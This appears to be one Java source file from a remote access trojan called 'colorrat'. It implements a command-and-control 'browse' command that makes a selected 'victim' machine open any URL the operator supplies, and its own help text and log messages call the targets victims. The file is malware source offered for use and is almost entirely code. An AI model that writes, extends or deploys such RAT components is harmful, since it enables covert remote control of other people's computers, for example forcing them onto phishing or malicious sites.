package eu.aragonapp.colorrat.command.types;

import eu.aragonapp.colorrat.ColorServer;
import eu.aragonapp.colorrat.command.Command;
import eu.aragonapp.colorrat.network.packet.types.server.S02OpenBrowser;

import java.net.URI;

/**
 * @Copyright (c) 2018 Mythic Inc. (http://www.mythic.com/) All Rights Reserved.
 * <p>
 * Mythic Inc. licenses this file to you under the Apache License,
 * @Version 2.0 (the "License"); you may not use this file except
 * in compliance with the License.
 * You may obtain a copy of the License at
 * @https://www.apache.org/licenses/LICENSE-2.0
 */
public class BrowseCommand implements Command {

    @Override
    public boolean execute(String[] args) {
        if (args.length == 1) {
            if(ColorServer.getInstance().getSelectedConnection() == null) {
                ColorServer.getLogger().error("Please select at first a victim with \"select <uid>\"!");
                return true;
            }

            String url = args[0];

            try {
                final URI uri = new URI(url);
                ColorServer.getInstance().getSelectedConnection().write(new S02OpenBrowser(uri));
                ColorServer.getLogger().error("Successfully sent the packet!");
            } catch (Exception ex) {
                ColorServer.getLogger().error("And error occurs: " + ex.getMessage());
            }
            return true;
        }
        return false;
    }

    @Override
    public String description() {
        return "Lets the selected victim opens a website";
    }

    @Override
    public String usage() {
        return "browse <url>";
    }

    @Override
    public String name() {
        return "browse";
    }

}
